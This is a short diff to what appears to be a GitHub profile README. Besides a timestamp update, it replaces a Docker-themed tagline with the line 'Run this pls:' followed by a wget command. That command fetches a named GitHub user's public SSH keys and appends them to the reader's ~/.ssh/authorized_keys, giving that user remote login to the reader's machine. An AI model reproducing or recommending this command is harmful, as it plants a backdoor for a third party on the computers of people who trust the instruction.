@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-🐳 Dockerizing the world, one piece at a time.
+✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
 
 <!--✏️ **Blog Posts**-->
 
@@ -28,4 +28,4 @@
 
 🕒 **Last Update**
 
-24-03-2025 01:22:01 UTC
+24-03-2025 04:20:44 UTC
